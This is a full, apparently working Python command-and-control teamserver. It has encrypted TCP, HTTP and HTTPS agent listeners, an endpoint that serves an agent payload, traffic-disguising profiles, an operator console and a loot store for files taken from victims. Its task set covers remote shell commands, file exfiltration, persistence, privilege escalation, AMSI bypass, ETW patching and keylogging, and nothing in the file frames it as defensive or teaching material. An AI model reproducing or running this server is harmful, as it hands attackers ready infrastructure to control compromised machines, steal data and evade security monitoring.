#!/usr/bin/env python3
"""Full C2 teamserver: TCP + HTTP + HTTPS agent transports,
operator port with RBAC login, SQLite backend, malleable profiles,
agent staging endpoint, loot storage, local admin console."""
import os, sys, json, socket, threading, time, uuid, base64, sqlite3, struct
import hashlib, hmac, ssl, getpass
from datetime import datetime, timedelta
from flask import Flask, request, Response
from werkzeug.serving import make_server
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography import x509
from cryptography.x509.oid import NameOID
from common import (aes_encrypt, aes_decrypt, rsa_encrypt, rsa_decrypt,
                    recv_exact, recv_msg, send_msg, DEFAULT_PROFILE)

# ---------- Config ----------
TCP_PORT, HTTP_PORT, HTTPS_PORT, OP_PORT = 4444, 8080, 8443, 5555
HOST = "0.0.0.0"
DB_PATH = "c2.db"
PRIV_PATH, PUB_PATH = "server_private.pem", "server_public.pem"
CERT_PATH, KEY_PATH = "server.crt", "server.key"
LOOT_DIR = "loot"
AGENT_PAYLOAD = "agent_payload.py"
BEACON_TIMEOUT = 300
PERSIST_CONN = {}


# ---------- Utilities ----------
def hash_password(password, salt=None):
    salt = salt or os.urandom(16)
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000)
    return f"{salt.hex()}:{h.hex()}"


def verify_password(password, stored):
    try:
        salt_hex, hash_hex = stored.split(":")
        salt = bytes.fromhex(salt_hex)
        h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000)
        return hmac.compare_digest(h.hex(), hash_hex)
    except Exception:
        return False


def ensure_rsa_keys():
    if os.path.exists(PRIV_PATH):
        with open(PRIV_PATH, "rb") as f:
            priv = serialization.load_pem_private_key(f.read(), password=None)
        with open(PUB_PATH, "rb") as f:
            pub = serialization.load_pem_public_key(f.read())
        return priv, pub
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    with open(PRIV_PATH, "wb") as f:
        f.write(priv.private_bytes(serialization.Encoding.PEM,
                                   serialization.PrivateFormat.PKCS8,
                                   serialization.NoEncryption()))
    with open(PUB_PATH, "wb") as f:
        f.write(pub.public_bytes(serialization.Encoding.PEM,
                                 serialization.PublicFormat.SubjectPublicKeyInfo))
    return priv, pub


def ensure_tls_cert():
    if os.path.exists(CERT_PATH) and os.path.exists(KEY_PATH):
        return
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "c2.local")])
    now = datetime.utcnow()
    cert = (x509.CertificateBuilder()
            .subject_name(subject).issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now).not_valid_after(now + timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .sign(key, hashes.SHA256()))
    with open(CERT_PATH, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(KEY_PATH, "wb") as f:
        f.write(key.private_bytes(serialization.Encoding.PEM,
                                  serialization.PrivateFormat.TraditionalOpenSSL,
                                  serialization.NoEncryption()))


# ---------- Database ----------
class DB:
    def __init__(self, path):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.lock = threading.Lock()
        self._init_schema()
        self._seed_defaults()

    def _init_schema(self):
        with self.lock:
            c = self.conn.cursor()
            c.executescript("""
                CREATE TABLE IF NOT EXISTS operators(
                    username TEXT PRIMARY KEY,
                    password TEXT NOT NULL,
                    role TEXT NOT NULL,
                    created_at REAL
                );
                CREATE TABLE IF NOT EXISTS agents(
                    id TEXT PRIMARY KEY,
                    machine_id TEXT,
                    hostname TEXT, username TEXT, os TEXT, os_version TEXT,
                    arch TEXT, pid INTEGER, ip TEXT,
                    session_key TEXT, info_json TEXT,
                    last_seen REAL, connected INTEGER, created_at REAL
                );
                CREATE TABLE IF NOT EXISTS tasks(
                    id TEXT PRIMARY KEY,
                    agent_id TEXT, command TEXT, args_json TEXT,
                    status TEXT, operator TEXT,
                    created_at REAL, completed_at REAL
                );
                CREATE TABLE IF NOT EXISTS results(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    task_id TEXT, agent_id TEXT, output TEXT, created_at REAL
                );
                CREATE TABLE IF NOT EXISTS profiles(
                    name TEXT PRIMARY KEY,
                    user_agent TEXT, register_uri TEXT,
                    beacon_uri TEXT, result_uri TEXT, headers_json TEXT
                );
                CREATE TABLE IF NOT EXISTS loot(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT, filename TEXT, data BLOB, created_at REAL
                );
                CREATE INDEX IF NOT EXISTS idx_agents_machine_id
                    ON agents(machine_id);
            """)
            self.conn.commit()

    def _seed_defaults(self):
        with self.lock:
            c = self.conn.cursor()
            n = c.execute("SELECT COUNT(*) FROM operators").fetchone()[0]
            if n == 0:
                pw = getpass.getpass("[*] Set admin password: ")
                c.execute("INSERT INTO operators VALUES (?,?,?,?)",
                          ("admin", hash_password(pw), "admin", time.time()))
                print("[+] Admin operator created (username: admin)")
            p = c.execute("SELECT COUNT(*) FROM profiles WHERE name=?",
                          (DEFAULT_PROFILE["name"],)).fetchone()[0]
            if p == 0:
                c.execute("INSERT INTO profiles VALUES (?,?,?,?,?,?)",
                          (DEFAULT_PROFILE["name"], DEFAULT_PROFILE["user_agent"],
                           DEFAULT_PROFILE["register_uri"], DEFAULT_PROFILE["beacon_uri"],
                           DEFAULT_PROFILE["result_uri"],
                           json.dumps(DEFAULT_PROFILE["headers"])))
            self.conn.commit()

    def execute(self, sql, args=()):
        with self.lock:
            cur = self.conn.execute(sql, args)
            self.conn.commit()
            return cur

    def query(self, sql, args=()):
        with self.lock:
            return self.conn.execute(sql, args).fetchall()


# ---------- Core ----------
class C2Core:
    def __init__(self, db, priv, pub):
        self.db = db
        self.priv = priv
        self.pub = pub
        os.makedirs(LOOT_DIR, exist_ok=True)
        self._profiles = self._load_profiles()

    def _load_profiles(self):
        m = {}
        for r in self.db.query("SELECT * FROM profiles"):
            m[r["register_uri"]] = ("register", r["name"])
            m[r["beacon_uri"]]   = ("beacon",   r["name"])
            m[r["result_uri"]]   = ("result",   r["name"])
        return m

    # ----- agent-facing -----
    def register_agent(self, session_key: bytes, info: dict, ip: str):
        mid = info.get("machine_id")
        existing = None
        if mid:
            rows = self.db.query(
                "SELECT id FROM agents WHERE machine_id=?", (mid,))
            if rows:
                existing = rows[0]["id"]

        if existing:
            aid = existing
            self.db.execute(
                "UPDATE agents SET session_key=?, last_seen=?, connected=1, "
                "ip=?, info_json=?, hostname=?, username=?, os=?, "
                "os_version=?, arch=?, pid=? WHERE id=?",
                (base64.b64encode(session_key).decode(), time.time(), ip,
                 json.dumps(info), info.get("hostname", "?"),
                 info.get("user", "?"), info.get("os", "?"),
                 info.get("os_version", "?"), info.get("arch", "?"),
                 info.get("pid", 0), aid))
            PERSIST_CONN[aid] = {"session_key": session_key, "ip": ip}
            print(f"\n[+] Agent reconnected: {aid[:8]} "
                  f"{info.get('hostname')}@{ip}")
            return aid

        aid = str(uuid.uuid4())
        self.db.execute(
            "INSERT INTO agents VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (aid, mid, info.get("hostname", "?"), info.get("user", "?"),
             info.get("os", "?"), info.get("os_version", "?"),
             info.get("arch", "?"), info.get("pid", 0), ip,
             base64.b64encode(session_key).decode(), json.dumps(info),
             time.time(), 1, time.time()))
        PERSIST_CONN[aid] = {"session_key": session_key, "ip": ip}
        print(f"\n[+] Agent online: {aid[:8]} "
              f"{info.get('hostname')}@{ip} ({info.get('os')})")
        return aid

    def mark_offline(self, aid):
        self.db.execute("UPDATE agents SET connected=0 WHERE id=?", (aid,))

    def agent_session_key(self, aid):
        c = PERSIST_CONN.get(aid)
        if c:
            return c["session_key"]
        row = self.db.query("SELECT session_key FROM agents WHERE id=?", (aid,))
        return base64.b64decode(row[0]["session_key"]) if row else None

    def beacon(self, aid):
        self.db.execute(
            "UPDATE agents SET last_seen=?, connected=1 WHERE id=?",
            (time.time(), aid))
        row = self.db.query(
            "SELECT * FROM tasks WHERE agent_id=? AND status='pending' "
            "ORDER BY created_at ASC LIMIT 1", (aid,))
        if not row:
            return {"type": "noop"}
        t = row[0]
        self.db.execute("UPDATE tasks SET status='sent' WHERE id=?", (t["id"],))
        return {"type": "task", "task_id": t["id"],
                "command": t["command"],
                "args": json.loads(t["args_json"] or "{}")}

    def submit_result(self, aid, task_id, output):
        self.db.execute(
            "INSERT INTO results(task_id,agent_id,output,created_at) "
            "VALUES (?,?,?,?)",
            (task_id, aid, output, time.time()))
        self.db.execute(
            "UPDATE tasks SET status='done', completed_at=? WHERE id=?",
            (time.time(), task_id))
        row = self.db.query("SELECT * FROM tasks WHERE id=?", (task_id,))
        if row and row[0]["command"] == "download" and output and \
                not output.startswith("[!"):
            try:
                data = base64.b64decode(output)
                args = json.loads(row[0]["args_json"] or "{}")
                fname = os.path.basename(args.get("path", "file"))
                with open(os.path.join(LOOT_DIR, f"{aid[:8]}_{fname}"), "wb") as f:
                    f.write(data)
            except Exception:
                pass

    # ----- operator-facing -----
    def process_command(self, session, cmd):
        name = cmd.get("cmd", "").lower()
        role = session.get("role")

        if name == "list":
            rows = self.db.query(
                "SELECT id,hostname,username,os,ip,last_seen,connected "
                "FROM agents ORDER BY created_at DESC")
            return {"status": "ok", "agents": [dict(r) for r in rows]}

        if name == "use":
            prefix = cmd.get("agent_id", "")
            rows = self.db.query("SELECT id FROM agents WHERE id LIKE ?",
                                 (prefix + "%",))
            if len(rows) != 1:
                return {"status": "error", "msg": f"{len(rows)} match(es)"}
            session["current_agent"] = rows[0]["id"]
            return {"status": "ok", "agent_id": rows[0]["id"]}

        if name == "back":
            session["current_agent"] = None
            return {"status": "ok"}

        if name in ("shell", "sysinfo", "ps", "env", "download", "upload",
                    "persist", "screenshot", "privesc", "amsi", "etw",
                    "keylog_start", "keylog_dump", "keylog_stop"):
            aid = session.get("current_agent")
            if not aid:
                return {"status": "error", "msg": "no agent selected (use <id>)"}
            if role == "viewer":
                return {"status": "error", "msg": "viewer role cannot task agents"}
            args = {k: v for k, v in cmd.items() if k not in ("cmd",)}
            tid = str(uuid.uuid4())
            self.db.execute(
                "INSERT INTO tasks VALUES (?,?,?,?,?,?,?,?)",
                (tid, aid, name, json.dumps(args), "pending",
                 session.get("username", "?"), time.time(), None))
            return {"status": "ok", "task_id": tid, "command": name}

        if name == "results":
            aid = session.get("current_agent")
            rows = self.db.query(
                "SELECT * FROM results WHERE agent_id=? ORDER BY id DESC LIMIT 20",
                (aid,)) if aid else \
                self.db.query("SELECT * FROM results ORDER BY id DESC LIMIT 30")
            return {"status": "ok", "results": [
                {"task_id": r["task_id"], "output": r["output"],
                 "time": r["created_at"]} for r in rows]}

        # ----- operator management -----
        if name == "list_operators":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            rows = self.db.query(
                "SELECT username,role,created_at FROM operators")
            return {"status": "ok", "operators": [dict(r) for r in rows]}

        if name == "add_operator":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            u = cmd.get("username"); p = cmd.get("password")
            r = cmd.get("role", "operator")
            if r not in ("admin", "operator", "viewer"):
                return {"status": "error", "msg": "bad role"}
            try:
                self.db.execute("INSERT INTO operators VALUES (?,?,?,?)",
                                (u, hash_password(p), r, time.time()))
                return {"status": "ok"}
            except sqlite3.IntegrityError:
                return {"status": "error", "msg": "username exists"}

        if name == "remove_operator":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            self.db.execute("DELETE FROM operators WHERE username=?",
                            (cmd["username"],))
            return {"status": "ok"}

        # ----- profiles -----
        if name == "list_profiles":
            rows = self.db.query("SELECT * FROM profiles")
            return {"status": "ok", "profiles": [dict(r) for r in rows]}

        if name == "add_profile":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            try:
                with open(cmd["path"], "r") as f:
                    p = json.load(f)
                self.db.execute(
                    "INSERT INTO profiles VALUES (?,?,?,?,?,?)",
                    (p["name"], p["user_agent"], p["register_uri"],
                     p["beacon_uri"], p["result_uri"],
                     json.dumps(p.get("headers", {}))))
                self._profiles = self._load_profiles()
                return {"status": "ok", "msg": f"profile '{p['name']}' added"}
            except sqlite3.IntegrityError:
                return {"status": "error", "msg": "profile exists"}
            except Exception as e:
                return {"status": "error", "msg": str(e)}

        return {"status": "error", "msg": f"unknown command: {name}"}

    def authenticate(self, user, pw):
        rows = self.db.query("SELECT * FROM operators WHERE username=?", (user,))
        if not rows or not verify_password(pw, rows[0]["password"]):
            return None
        return {"username": rows[0]["username"], "role": rows[0]["role"]}


# ---------- TCP agent transport ----------
def tcp_agent_loop(core, conn, addr):
    aid = None
    try:
        raw = recv_msg(conn)
        if not raw:
            return
        reg = json.loads(rsa_decrypt(core.priv, raw))
        session_key = base64.b64decode(reg["session_key"])
        aid = core.register_agent(session_key, reg["info"], addr[0])
        send_msg(conn, aes_encrypt(session_key,
                                   json.dumps({"status": "ok",
                                               "agent_id": aid}).encode()))
        while True:
            data = recv_msg(conn)
            if not data:
                break
            msg = json.loads(aes_decrypt(session_key, data))
            if msg["type"] == "beacon":
                send_msg(conn, aes_encrypt(session_key,
                                           json.dumps(core.beacon(aid)).encode()))
            elif msg["type"] == "result":
                core.submit_result(aid, msg["task_id"], msg.get("output", ""))
    except Exception as e:
        print(f"[!] tcp agent {addr[0]}: {e}")
    finally:
        if aid:
            core.mark_offline(aid)
            print(f"[-] Agent offline: {aid[:8]}")
        conn.close()


def tcp_listener(core):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, TCP_PORT))
    s.listen(50)
    print(f"[*] TCP agent listener   ->  {HOST}:{TCP_PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=tcp_agent_loop,
                         args=(core, conn, addr), daemon=True).start()


# ---------- HTTP / HTTPS transport ----------
def make_flask_app(core):
    app = Flask("c2")

    @app.route("/<path:path>", methods=["POST"])
    def dispatch(path):
        uri = "/" + path
        entry = core._profiles.get(uri)
        if not entry:
            return Response("not found", status=404)
        action, _name = entry
        try:
            if action == "register":
                reg = json.loads(rsa_decrypt(core.priv, request.get_data()))
                sk = base64.b64decode(reg["session_key"])
                aid = core.register_agent(sk, reg["info"], request.remote_addr)
                return Response(
                    aes_encrypt(sk, json.dumps(
                        {"status": "ok", "agent_id": aid}).encode()),
                    mimetype="application/octet-stream")

            if action == "beacon":
                aid = request.headers.get("X-Agent-Id") or request.args.get("id")
                sk = core.agent_session_key(aid) if aid else None
                if not sk:
                    return Response("unauthorized", status=401)
                return Response(
                    aes_encrypt(sk, json.dumps(core.beacon(aid)).encode()),
                    mimetype="application/octet-stream")

            if action == "result":
                aid = request.headers.get("X-Agent-Id")
                sk = core.agent_session_key(aid) if aid else None
                if not sk:
                    return Response("unauthorized", status=401)
                msg = json.loads(aes_decrypt(sk, request.get_data()))
                core.submit_result(aid, msg["task_id"], msg.get("output", ""))
                return Response(b"ok")

        except Exception as e:
            return Response(f"error: {e}", status=500)

    @app.route("/stage", methods=["GET"])
    def stage():
        if os.path.exists(AGENT_PAYLOAD):
            with open(AGENT_PAYLOAD, "rb") as f:
                return Response(f.read(), mimetype="text/x-python")
        return Response("not available", status=404)

    return app


def http_listener(core):
    app = make_flask_app(core)
    srv = make_server(HOST, HTTP_PORT, app, threaded=True)
    print(f"[*] HTTP agent listener  ->  {HOST}:{HTTP_PORT}")
    srv.serve_forever()


def https_listener(core):
    app = make_flask_app(core)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)
    srv = make_server(HOST, HTTPS_PORT, app, threaded=True, ssl_context=ctx)
    print(f"[*] HTTPS agent listener ->  {HOST}:{HTTPS_PORT}")
    srv.serve_forever()


# ---------- Operator transport ----------
def operator_loop(core, conn, addr):
    session = None
    try:
        raw = recv_msg(conn)
        if not raw:
            return
        login = json.loads(raw)
        if login.get("cmd") != "login":
            send_msg(conn, json.dumps({"status": "error",
                                       "msg": "login required"}).encode())
            return
        user = core.authenticate(login.get("username", ""),
                                 login.get("password", ""))
        if not user:
            send_msg(conn, json.dumps({"status": "error",
                                       "msg": "invalid credentials"}).encode())
            return
        send_msg(conn, json.dumps({"status": "ok",
                                   "username": user["username"],
                                   "role": user["role"]}).encode())
        session = {**user, "current_agent": None}
        print(f"[*] Operator '{user['username']}' connected from {addr[0]}")
        while True:
            raw = recv_msg(conn)
            if not raw:
                break
            cmd = json.loads(raw)
            result = core.process_command(session, cmd)
            send_msg(conn, json.dumps(result).encode())
    except Exception as e:
        print(f"[!] operator {addr[0]}: {e}")
    finally:
        if session:
            print(f"[-] Operator '{session['username']}' disconnected")
        conn.close()


def operator_listener(core):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, OP_PORT))
    s.listen(20)
    print(f"[*] Operator listener    ->  {HOST}:{OP_PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=operator_loop,
                         args=(core, conn, addr), daemon=True).start()


# ---------- Watchdog ----------
def offline_watchdog(core):
    while True:
        time.sleep(30)
        cutoff = time.time() - BEACON_TIMEOUT
        try:
            core.db.execute(
                "UPDATE agents SET connected=0 "
                "WHERE connected=1 AND last_seen < ?", (cutoff,))
        except Exception:
            pass


# ---------- Local console ----------
HELP_TEXT = """Commands:
  list                                 List agents
  use <id_prefix>                      Select agent
  back                                 Deselect
  shell <command>                      Execute shell command (queued)
  sysinfo                              Remote system info
  ps                                   Process list
  env                                  Environment variables
  download <remote_path>               Exfil file (saved to loot/)
  upload <local_path> <remote_path>    Push file
  persist <type>                       cron|rc|systemd|registry|schtask|startup|launchagent
  screenshot                           Capture screenshot
  privesc                              Enumerate privilege escalation vectors
  amsi                                 Windows AMSI bypass
  etw                                  Windows ETW patch
  keylog_start | keylog_dump | keylog_stop
  results                              Show results for selected agent
  list_operators                       List operators (admin)
  add_operator <u> <p> <role>          Add operator   (admin)
  remove_operator <u>                  Remove operator(admin)
  list_profiles                        List malleable profiles
  add_profile <path.json>              Add profile from JSON (admin)
  help                                 Show this
  exit                                 Shutdown server"""


def parse_line(core, session, line):
    parts = line.split(maxsplit=3)
    if not parts:
        return None
    name = parts[0].lower()
    cmd = {"cmd": name}
    if name == "use":
        cmd["agent_id"] = parts[1] if len(parts) > 1 else ""
    elif name == "shell" and len(parts) > 1:
        cmd["command"] = line[len("shell "):].strip()
    elif name == "download" and len(parts) > 1:
        cmd["path"] = parts[1]
    elif name == "upload" and len(parts) > 2:
        try:
            with open(parts[1], "rb") as f:
                cmd["content"] = base64.b64encode(f.read()).decode()
            cmd["remote"] = parts[2]
        except Exception as e:
            return {"status": "error", "msg": str(e)}
    elif name == "persist" and len(parts) > 1:
        cmd["kind"] = parts[1]
    elif name == "add_operator" and len(parts) >= 3:
        cmd["username"] = parts[1]
        cmd["password"] = parts[2]
        cmd["role"] = parts[3] if len(parts) > 3 else "operator"
    elif name == "remove_operator" and len(parts) > 1:
        cmd["username"] = parts[1]
    elif name == "add_profile" and len(parts) > 1:
        cmd["path"] = parts[1]
    return core.process_command(session, cmd)


def display(core, session, result):
    if not result:
        return
    st = result.get("status")
    if st == "error":
        print(f"[!] {result.get('msg')}")
        return
    if "agents" in result:
        if not result["agents"]:
            print("[*] No agents.")
            return
        print(f"{'ID':10} {'HOST':20} {'USER':15} {'OS':10} {'IP':15} {'LAST'}")
        for a in result["agents"]:
            alive = "alive" if a["connected"] else "dead"
            last = datetime.fromtimestamp(a["last_seen"] or 0).strftime("%H:%M:%S")
            print(f"{a['id'][:8]:10} {(a['hostname'] or '?')[:19]:20} "
                  f"{(a['username'] or '?')[:14]:15} {(a['os'] or '?')[:9]:10} "
                  f"{(a['ip'] or '?')[:14]:15} {last} {alive}")
    elif "agent_id" in result:
        print(f"[*] Agent selected: {result['agent_id'][:8]}")
    elif "task_id" in result:
        print(f"[*] Task queued: {result['command']} ({result['task_id'][:8]})")
    elif "results" in result:
        if not result["results"]:
            print("[*] No results yet.")
            return
        for r in result["results"]:
            print(f"--- {r['task_id'][:8]} ---")
            print((r["output"] or "")[:4000])
    elif "operators" in result:
        for o in result["operators"]:
            print(f"  {o['username']:20} {o['role']}")
    elif "profiles" in result:
        for p in result["profiles"]:
            print(f"  {p['name']:15} {p['register_uri']} | "
                  f"{p['beacon_uri']} | {p['result_uri']}")
    elif "msg" in result:
        print(f"[*] {result['msg']}")
    else:
        print(result)


def console(core):
    print(HELP_TEXT)
    session = {"username": "admin", "role": "admin", "current_agent": None}
    while True:
        try:
            tag = session["current_agent"][:8] if session["current_agent"] else "none"
            line = input(f"[c2:{tag}] > ").strip()
            if not line:
                continue
            if line.lower() == "exit":
                print("[*] Shutting down.")
                os._exit(0)
            if line.lower() == "help":
                print(HELP_TEXT)
                continue
            r = parse_line(core, session, line)
            display(core, session, r)
        except KeyboardInterrupt:
            print()
        except EOFError:
            os._exit(0)


# ---------- Main ----------
def main():
    ensure_tls_cert()
    priv, pub = ensure_rsa_keys()
    db = DB(DB_PATH)
    core = C2Core(db, priv, pub)

    print(f"[*] Server public key: {os.path.abspath(PUB_PATH)}  (copy to agent)")

    threading.Thread(target=tcp_listener, args=(core,), daemon=True).start()
    threading.Thread(target=http_listener, args=(core,), daemon=True).start()
    threading.Thread(target=https_listener, args=(core,), daemon=True).start()
    threading.Thread(target=operator_listener, args=(core,), daemon=True).start()
    threading.Thread(target=offline_watchdog, args=(core,), daemon=True).start()

    time.sleep(0.5)
    console(core)


if __name__ == "__main__":
    main()
